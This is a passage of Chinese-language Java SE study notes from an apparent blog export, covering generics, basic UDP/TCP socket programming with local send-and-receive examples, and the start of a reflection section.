<h5 id="1-2-泛型接口"><a href="#1-2-泛型接口" class="headerlink" title="1.2 泛型接口"></a>1.2 泛型接口</h5><p><strong>格式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Inte</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>泛型字母不能使用在接口静态方法中，不能使用在全局常量中（隐含static）。</p>
</blockquote>
<h5 id="1-3-泛型方法"><a href="#1-3-泛型方法" class="headerlink" title="1.3 泛型方法"></a>1.3 泛型方法</h5><blockquote>
<p>在public与返回值之间的<T>必不可少，这表明这是一个泛型方法.</p>
<p>并且声明了一个泛型T，这个T可以出现在这个泛型方法的任意位置</p>
</blockquote>
<p><strong>格式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T,T1&gt; <span class="function"><span class="keyword">void</span> <span class="title">Test</span><span class="params">(T t,T1,t1)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="1-4-静态方法"><a href="#1-4-静态方法" class="headerlink" title="1.4 静态方法"></a>1.4 静态方法</h5><blockquote>
<p><strong>静态方法无法访问类上定义的泛型</strong></p>
<p>如果静态方法要使用泛型的话，必须将静态方法也定义成泛型方法 </p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span>&lt;T,T1&gt; <span class="keyword">void</span> <span class="title">Test</span><span class="params">(T t,T1,t1)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="1-5-通配符"><a href="#1-5-通配符" class="headerlink" title="1.5 通配符"></a>1.5 通配符</h5><blockquote>
<p> 类型不定，使用时确定类型</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test1&lt;?&gt; s=<span class="keyword">new</span> Test1&lt;String&gt;();</span><br></pre></td></tr></table></figure>

<h5 id="1-6-泛型的上下边界"><a href="#1-6-泛型的上下边界" class="headerlink" title="1.6 泛型的上下边界"></a>1.6 泛型的上下边界</h5><p>为泛型添加上边界，即传入的类型实参必须是指定类型的子类型</p>
<p> ? extends : &lt;=上限  为泛型添加上边界，即传入的类型实参必须是指定类型的子类型</p>
<p> ? super：&gt;=下限 指定类型为自身或父类、</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    T score; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Test1&lt;?&gt; s)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">(Test1&lt;?extends Fruit&gt; s)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">(Test1&lt;?<span class="keyword">super</span> Fruit&gt; s)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="2、自定义泛型"><a href="#2、自定义泛型" class="headerlink" title="2、自定义泛型"></a>2、自定义泛型</h3><h5 id="2-1-继承关系"><a href="#2-1-继承关系" class="headerlink" title="2.1 继承关系"></a>2.1 继承关系</h5><blockquote>
<p>​    <strong>T&gt;Object，子类&gt;=父类泛型</strong></p>
</blockquote>
<ul>
<li>父类为泛型类：属性，方法；子类：使用时指定具体类型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">Father</span>&lt;<span class="title">String</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>子类为泛型类,类型在使用时确定</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child1</span>&lt;<span class="title">T</span>&gt; <span class="keyword">extends</span> <span class="title">Father</span>&lt;<span class="title">T</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>子类为泛型类，父类不指定类型（泛型的擦除，用Object）<br>​                    （不能子类擦除，父类泛型） </li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child2</span> &lt;<span class="title">T</span>&gt;<span class="keyword">extends</span>  <span class="title">Father</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>子类和父类同时擦除</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child3</span> <span class="keyword">extends</span> <span class="title">Father</span></span></span><br></pre></td></tr></table></figure>



<h5 id="2-2-重写参数类型"><a href="#2-2-重写参数类型" class="headerlink" title="2.2 重写参数类型"></a>2.2 重写参数类型</h5><ul>
<li><p>重写方法时，方法形参随父亲而定 </p>
</li>
<li><p>属性子类随子类，父类随父类</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">Father</span>&lt;<span class="title">String</span>&gt;</span>&#123;</span><br><span class="line">    String t2;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3、泛型的擦除"><a href="#3、泛型的擦除" class="headerlink" title="3、泛型的擦除"></a>3、泛型的擦除</h3><blockquote>
<p><strong>继承和声明时不指定类型，用Object对待</strong></p>
</blockquote>
<ul>
<li><p><strong>Java泛型擦除是Java泛型的一个重要特性，目的是避免过多的创建类造成的性能损耗</strong></p>
</li>
<li><p>JVM并不知道泛型的存在，因为泛型在编译阶段就已经被处理成普通的类和方法； </p>
</li>
<li><p>而泛型会在数据取出进行一个强制类型转换</p>
</li>
</ul>
<p><strong>擦除规则</strong></p>
<ul>
<li>若泛型类型没有指定具体类型，用Object作为原始类型；</li>
<li>若有限定类型&lt; T exnteds XClass &gt;，使用XClass作为原始类型；</li>
<li>若有多个限定&lt; T exnteds XClass1 &amp; XClass2 &gt;，使用第一个边界类型XClass1作为原始类型；</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child3</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4、泛型的嵌套"><a href="#4、泛型的嵌套" class="headerlink" title="4、泛型的嵌套"></a>4、泛型的嵌套</h3><p> 泛型的嵌套：与调用没有关系。从外到内拆分</p>
<h3 id="5、泛型与数组"><a href="#5、泛型与数组" class="headerlink" title="5、泛型与数组"></a>5、泛型与数组</h3><blockquote>
<h5 id="没有泛型数组-，可以声明，不能创建"><a href="#没有泛型数组-，可以声明，不能创建" class="headerlink" title="没有泛型数组  ，可以声明，不能创建"></a><strong>没有泛型数组  ，可以声明，不能创建</strong></h5></blockquote>
<p><strong>！！！</strong>由于JVM在编译时是不知道泛型的存在的，泛型是数据获取时进行的强制类型转换，若是创建泛型数组，进行强制类型转换时会出行<code>ClassCastException</code>!</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt;[] ls &#x3D; new ArrayList&lt;String&gt;[10]; &#x2F;&#x2F;不可以</span><br><span class="line"></span><br><span class="line">List&lt;?&gt;[] ls &#x3D; new ArrayList&lt;?&gt;[10]; &#x2F;&#x2F;可以</span><br><span class="line"></span><br><span class="line">List&lt;String&gt;[] ls &#x3D; new ArrayList[10]; &#x2F;&#x2F;可以</span><br></pre></td></tr></table></figure>

<h3 id="6、泛型不能使用多态"><a href="#6、泛型不能使用多态" class="headerlink" title="6、泛型不能使用多态"></a>6、泛型不能使用多态</h3><p>泛型不能使用多态： A<Fruit> test(){ return A<Apple>; } 错误</p>
<p>​    使用：只能在声明时使用（不能在声明类或使用时使用问号）</p>
]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>网络编程</title>
    <url>/2020/11/11/08%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h3><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><ul>
<li>在网络通信协议下，实现<strong>网络互连</strong>的不同计算机运行的程序间可以进行数据交换</li>
</ul>
<h4 id="1-1-三要素"><a href="#1-1-三要素" class="headerlink" title="1.1  三要素"></a>1.1  三要素</h4><ul>
<li><strong>IP地址</strong>：使得每台计算机得以通信，为计算机指定一个识别号，即<strong>设备的标识</strong></li>
<li><strong>端口</strong>：网络的通信，本质上是俩个应用程序的通信，即<strong>应用程序的标识</strong></li>
<li><strong>协议</strong>：位于同一个网络中的计算机进行连接和通信是需要遵守一定的规则，这些规则被称为网络通信协议。对数据的<strong>传输格式、传输速率、传输步骤</strong>等做了统一规定。常见的协议有UDP协议和TCP协议</li>
</ul>
<h4 id="1-2-IP地址"><a href="#1-2-IP地址" class="headerlink" title="1.2 IP地址"></a>1.2 IP地址</h4><blockquote>
<p>网络中设备的唯一标识</p>
</blockquote>
<ul>
<li><p>IPV4：给每个连接在网络上的主机分配一个32bit地址(4个字节)，IP地址用二进制表示。</p>
<p>​            IP地址被写成十进制形式(点分十进制表示法)  4*8个二进制数</p>
<p>​            192.168.137.1</p>
</li>
<li><p>IPV6：采用128bit地址，即16个字节一组，分成8组十六进制数</p>
<p>​            fd7d:cdbc:2395:0:8d3f:6f5e:c964:8f63</p>
</li>
</ul>
<blockquote>
<p>常用命令</p>
<ul>
<li>ipconfig：查看本机IP地址</li>
<li>ping IP地址：检查网络是否连通</li>
<li>特殊IP地址：127.0.0.1 回送地址，可以代表本机地址，一般用来测试使用</li>
</ul>
</blockquote>
<h5 id="1-2-1-InetAddress"><a href="#1-2-1-InetAddress" class="headerlink" title="1.2.1 InetAddress"></a>1.2.1 InetAddress</h5><blockquote>
<p>对IP地址的获取和操作</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">方法名</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">static InetAddress  getByName(String host)</td>
<td align="left">确定主机的IP地址，主机名称可以机器名称，也可以是IP地址</td>
</tr>
<tr>
<td align="center">String getHostName()</td>
<td align="left">获取该IP地址的主机名</td>
</tr>
<tr>
<td align="center">String getHostAddress()</td>
<td align="left">返回文本显示中IP地址字符串</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress inetAddress = InetAddress.getByName(<span class="string">&quot;DESKTOP-GD4A4EF&quot;</span>);</span><br><span class="line">System.out.println(inetAddress);<span class="comment">//DESKTOP-GD4A4EF/192.168.2.54</span></span><br><span class="line"></span><br><span class="line">String ip = inetAddress.getHostAddress();</span><br><span class="line">String hostName = inetAddress.getHostName();</span><br><span class="line">System.out.println(<span class="string">&quot;IP地址&quot;</span>+ip+<span class="string">&quot;主机名&quot;</span>+hostName);<span class="comment">//192.168.2.54  DESKTOP-GD4A4EF</span></span><br></pre></td></tr></table></figure>



<h4 id="1-3-端口"><a href="#1-3-端口" class="headerlink" title="1.3 端口"></a>1.3 端口</h4><blockquote>
<p>俩个字节表示的整数，取值范围0~65535。若果端口号被另外一个服务或应用所占用，会导致应用程序启动失败</p>
</blockquote>
<h4 id="1-4-协议"><a href="#1-4-协议" class="headerlink" title="1.4 协议"></a>1.4 协议</h4><h5 id="（1）UDP协议"><a href="#（1）UDP协议" class="headerlink" title="（1）UDP协议"></a>（1）UDP协议</h5><blockquote>
<p>用户数据报协议 User Datagram Protocol</p>
</blockquote>
<ul>
<li><strong>无连接通信协议</strong>，即在数据传输时，数据的发送端和接收端不建立逻辑连接。也就是说，A向B发送数据时，发送端不会确认接收端是否存在，就会发出数据；同样，接收端在收到数据时，也不会向发送端反馈是否收到数据。</li>
<li>UDP的面向无连接性，不能保证数据的完整性，在传输重要数据时不建议使用UDP协议</li>
</ul>
<h5 id="（2）TCP协议"><a href="#（2）TCP协议" class="headerlink" title="（2）TCP协议"></a>（2）TCP协议</h5><blockquote>
<p>传输控制协议 Transmission Control Protocol</p>
</blockquote>
<ul>
<li><strong>面向连接</strong>的通信协议，即传输数据时，发送端和接收端建立逻辑连接，然后再传输数据。它提供了俩台计算机之间<strong>可靠无差错</strong>的数据传输。</li>
<li>在TCP连接中必须明确客户端和服务器端，由客户端向服务器发出连接请求，每次连接的创建都要经过三次握手</li>
</ul>
<h5 id="（3）三次握手"><a href="#（3）三次握手" class="headerlink" title="（3）三次握手"></a>（3）三次握手</h5><p>TCP协议中，在发送数据的准备阶段，客户端和服务器端之间的三次交互，以保证连接的可靠性</p>
<ul>
<li>第一次握手：客户端向服务器端发送连接请求，等待服务器确认</li>
<li>第二次握手：服务器端向客户端回送一个响应，通知客户端收到了连接请求</li>
<li>第三次握手：客户端再次向服务器端发送确认信息，确认连接</li>
</ul>
<h3 id="二、UDP通信程序"><a href="#二、UDP通信程序" class="headerlink" title="二、UDP通信程序"></a>二、UDP通信程序</h3><h4 id="1-1-UDP通信原理"><a href="#1-1-UDP通信原理" class="headerlink" title="1.1 UDP通信原理"></a>1.1 UDP通信原理</h4><p>一种不可靠的网络协议，它在通信的俩端各建立一个Socket对象，但仅仅只是发送、接收数据的对象，因此对于基于UDP协议的通信双方而言，没有所谓客户端和服务器的概念。</p>
<h4 id="2-2UDP发送数据"><a href="#2-2UDP发送数据" class="headerlink" title="2.2UDP发送数据"></a>2.2UDP发送数据</h4><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ul>
<li>创建发送端Socket对象</li>
<li>创建数据，并把数据打包<code>new DatagramPacket(bytes,length,inetAddress,port)</code>（数据报包）</li>
<li>调用<code>DatagramSocke.send(DatagramPacket)</code>对象的方法发送数据</li>
<li>关闭发送端 </li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用DatagramSocket对象发送数据</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//1、创建发送端的Socket对象</span></span><br><span class="line">    DatagramSocket datagramSocket = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line">    <span class="comment">//2、创建数据，并把数据打包成数据报包</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytes=<span class="string">&quot;hello word&quot;</span>.getBytes();</span><br><span class="line">    <span class="comment">//buf-数组 length-数据长度 address-ip地址 port-端口地址</span></span><br><span class="line">    DatagramPacket datagramPacket=<span class="keyword">new</span> DatagramPacket(bytes,bytes.length,InetAddress.getByName(<span class="string">&quot;DESKTOP-GD4A4EF&quot;</span>),<span class="number">10086</span>);</span><br><span class="line">    <span class="comment">//3、调用DatagramSocket对象发送数据报包</span></span><br><span class="line">    datagramSocket.send(datagramPacket);</span><br><span class="line">    <span class="comment">//4、关闭发送端</span></span><br><span class="line">    datagramSocket.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-UDP接收数据"><a href="#2-3-UDP接收数据" class="headerlink" title="2.3 UDP接收数据"></a>2.3 UDP接收数据</h4><h5 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h5><ul>
<li>创建接收端Socket对象 <code>new DatagramSocket(port)</code></li>
<li>创建数据报包，用来接收数据 <code>DatagramPacket(byte[],int length)</code></li>
<li>调用<code>DatagramSocket.receive</code>对象用来接收数据</li>
<li>解析数据报包，并把数据在控制台显示 <code>DatagramPacket.getData()</code></li>
<li>关闭接收端</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、创建接收端的Socket对象</span></span><br><span class="line">DatagramSocket datagramSocket = <span class="keyword">new</span> DatagramSocket(<span class="number">10086</span>);</span><br><span class="line"><span class="comment">//2、创建数据报包，用来接收数据</span></span><br><span class="line"><span class="keyword">byte</span>[] bytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">DatagramPacket datagramPacket = <span class="keyword">new</span> DatagramPacket(bytes,bytes.length);</span><br><span class="line"><span class="comment">//3、调用DatagramSocket对象用来接收数据报包</span></span><br><span class="line">datagramSocket.receive(datagramPacket);</span><br><span class="line"><span class="comment">//4、解析数据报包</span></span><br><span class="line"><span class="keyword">byte</span>[] data = datagramPacket.getData();</span><br><span class="line">String dataString=<span class="keyword">new</span> String(data,<span class="number">0</span>,data.length);</span><br><span class="line">System.out.println(dataString);</span><br><span class="line"><span class="comment">//5、关闭接收端</span></span><br><span class="line">datagramSocket.close();</span><br></pre></td></tr></table></figure>

<h4 id="2-4-类聊天室实例"><a href="#2-4-类聊天室实例" class="headerlink" title="2.4 类聊天室实例"></a>2.4 类聊天室实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> *  使用键盘录入数据，发送给接收端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdpPractiseSend</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建发送端的Socket对象</span></span><br><span class="line">        DatagramSocket datagramSocket = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line"></span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line">        String line=<span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//键盘录入数据</span></span><br><span class="line">        BufferedReader br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line">        <span class="keyword">while</span> ((line=br.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;886&quot;</span>.equals(line))&#123;</span><br><span class="line">                <span class="comment">//如果输入为 886 则结束发送数据报包</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建数据，并将数据打包</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes=line.getBytes();</span><br><span class="line">            DatagramPacket datagramPacket = <span class="keyword">new</span> DatagramPacket(bytes,bytes.length, InetAddress.getByName(<span class="string">&quot;DESKTOP-GD4A4EF&quot;</span>),<span class="number">10000</span>);</span><br><span class="line">            <span class="comment">//调用DatagramSocket对象发送数据报包</span></span><br><span class="line">            datagramSocket.send(datagramPacket);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//关闭发送端</span></span><br><span class="line">        datagramSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> *      因为接收端不知道什么时候停止发送，故用死循环</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdpPractiseReceive</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建接收端的Socket对象</span></span><br><span class="line">        DatagramSocket datagramSocket = <span class="keyword">new</span> DatagramSocket(<span class="number">10000</span>);</span><br><span class="line">        <span class="comment">//创建一个数据包,用来接收数据报包</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            DatagramPacket datagramPacket = <span class="keyword">new</span> DatagramPacket(bytes, bytes.length);</span><br><span class="line">            <span class="comment">//调用DatagramSocket对象用来接收数据</span></span><br><span class="line">            datagramSocket.receive(datagramPacket);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//解析数据报包，显示在控制台</span></span><br><span class="line">            System.out.println(<span class="string">&quot;数据是:&quot;</span> + <span class="keyword">new</span> String(datagramPacket.getData(), <span class="number">0</span>, datagramPacket.getLength()));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三、TCP通信程序"><a href="#三、TCP通信程序" class="headerlink" title="三、TCP通信程序"></a>三、TCP通信程序</h3><h4 id="3-1-通信原理"><a href="#3-1-通信原理" class="headerlink" title="3.1 通信原理"></a>3.1 通信原理</h4><p>可靠的网络协议，在通信的俩端各建立一个Socket对象，从而在通信的俩端形成<strong>网络虚拟链路</strong>。</p>
<p>俩端的程序通过虚拟链路进行通信</p>
<p>Java对基于TCP协议的网络提供良好的封装，使用Socket对象代表俩端的通信端口，并通过<strong>Socket产生IO流</strong>进行网络通信。</p>
<p>Java为客户端提供了<code>Socket</code>类，为服务器端提供了<code>ServerSocket</code>类</p>
<h4 id="3-2-发送数据"><a href="#3-2-发送数据" class="headerlink" title="3.2 发送数据"></a>3.2 发送数据</h4><h5 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h5><ul>
<li>创建客户端的Socket对象<code>Socket(String host,int port)</code></li>
<li>获取输出流，写数据  <code>OutputStream getOutputStream()</code></li>
<li>释放资源</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建客户端的Socket对象</span></span><br><span class="line">Socket socket = <span class="keyword">new</span> Socket(InetAddress.getByName(<span class="string">&quot;DESKTOP-GD4A4EF&quot;</span>), <span class="number">18000</span>);</span><br><span class="line"><span class="comment">//获取输出流</span></span><br><span class="line">OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">outputStream.write(<span class="string">&quot;hello TCP&quot;</span>.getBytes());</span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">socket.close();</span><br></pre></td></tr></table></figure>

<h4 id="3-3-接收数据"><a href="#3-3-接收数据" class="headerlink" title="3.3 接收数据"></a>3.3 接收数据</h4><h5 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h5><ul>
<li>创建服务器端的Socket对象<code>ServerSocket(int port)</code></li>
<li>监听客户端连接 <code>serverSocket.accept()</code></li>
<li>获取输入流，读数据，并把数据显示在控制台 <code>accept.getInputStream()</code></li>
<li>释放资源</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取服务器端的Socket对象</span></span><br><span class="line">ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">18000</span>);</span><br><span class="line"><span class="comment">//2.监听客户端连接</span></span><br><span class="line">Socket accept = serverSocket.accept();</span><br><span class="line"><span class="comment">//3.创建输入流,获取数据</span></span><br><span class="line">InputStream inputStream = accept.getInputStream();</span><br><span class="line"><span class="keyword">byte</span>[] bytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> read = inputStream.read(bytes);</span><br><span class="line">String data=<span class="keyword">new</span> String(bytes,<span class="number">0</span>,read);</span><br><span class="line">System.out.println(data);</span><br><span class="line"><span class="comment">//4.释放资源</span></span><br><span class="line">serverSocket.close();</span><br></pre></td></tr></table></figure>

<h4 id="3-4-服务器给出反馈"><a href="#3-4-服务器给出反馈" class="headerlink" title="3.4 服务器给出反馈"></a>3.4 服务器给出反馈</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket socket=<span class="keyword">new</span> Socket(InetAddress.getByName(<span class="string">&quot;DESKTOP-GD4A4EF&quot;</span>),<span class="number">12000</span>);</span><br><span class="line">OutputStream outputStream = socket.getOutputStream();</span><br><span class="line"><span class="comment">//创建输出流，数据来源与键盘录入</span></span><br><span class="line">BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line=bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;886&quot;</span>.equals(line))&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    outputStream.write(line.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建输入流,接收服务器端回馈信息</span></span><br><span class="line">InputStream inputStream = socket.getInputStream();</span><br><span class="line"><span class="keyword">byte</span>[] bytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> read = inputStream.read(bytes);</span><br><span class="line">System.out.println(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,read));</span><br><span class="line"></span><br><span class="line">socket.close();</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">12000</span>);</span><br><span class="line">Socket accept = serverSocket.accept();</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">    InputStream inputStream = accept.getInputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] bytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> read = inputStream.read(bytes);</span><br><span class="line">    System.out.println(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,read));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建服务器端输出流,回馈客户端信息</span></span><br><span class="line">    OutputStream outputStream = accept.getOutputStream();</span><br><span class="line">    outputStream.write(<span class="string">&quot;服务器收到请求&quot;</span>.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>反射</title>
    <url>/2020/11/11/09%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><blockquote>
<p><strong>反射就是把java类中的各种成分映射成一个个的java对象模板</strong></p>
</blockquote>
<h1 id="基本应用"><a href="#基本应用" class="headerlink" title="基本应用"></a>基本应用</h1><h2 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h2><p>Object类方法，根据一个字符串得到类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s=<span class="string">&quot;jjj&quot;</span>;</span><br><span class="line"><span class="comment">//根据字符串得到一个类</span></span><br><span class="line">Class c=s.getClass();</span><br><span class="line">System.out.println(c.getName());</span><br></pre></td></tr></table></figure>

<h2 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName"></a>Class.forName</h2><p>根据类的全限名得到运行时类信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//包名+类名</span></span><br><span class="line">String s1=<span class="string">&quot;java.lang.String&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class c1=Class.forName(s1);</span><br><span class="line">    System.out.println(c1.getName());</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="获取class对象"><a href="#获取class对象" class="headerlink" title="获取class对象"></a>获取class对象</h1><h2 id="根据对象获取"><a href="#根据对象获取" class="headerlink" title="根据对象获取"></a>根据对象获取</h2><p><code>new Student().getClass()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Student stu1 = <span class="keyword">new</span> Student();<span class="comment">//这一new 产生一个Student对象，一个Class对象。</span></span><br><span class="line">Class stuClass = stu1.getClass();<span class="comment">//获取Class对象</span></span><br><span class="line">System.out.println(stuClass.getName());</span><br></pre></td></tr></table></figure>

<h2 id="class"><a href="#class" class="headerlink" title=".class"></a>.class</h2><blockquote>
<p>任何数据类型都有一个静态的class属性</p>
</blockquote>
